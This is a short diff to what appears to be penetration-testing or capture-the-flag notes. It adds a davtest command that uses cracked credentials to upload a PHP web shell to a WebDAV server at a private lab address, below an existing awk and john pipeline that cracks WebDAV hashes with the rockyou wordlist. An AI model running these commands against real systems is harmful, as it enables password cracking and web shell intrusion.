@@ -16,3 +16,6 @@ awk '{print "admin:XAMPP with WebDAV:" $0}' /usr/share/wordlists/rockyou.txt | j
 
 ## john
 awk '{print "admin:XAMPP with WebDAV:" $0}' /usr/share/wordlists/rockyou.txt | john hashes.txt --format=raw-md5 --pipe  
+
+## webdav
+davtest -url http://10.13.1.146/webdav -auth admin:s3cr3t -uploadfile shell.php -uploadloc shell.php  
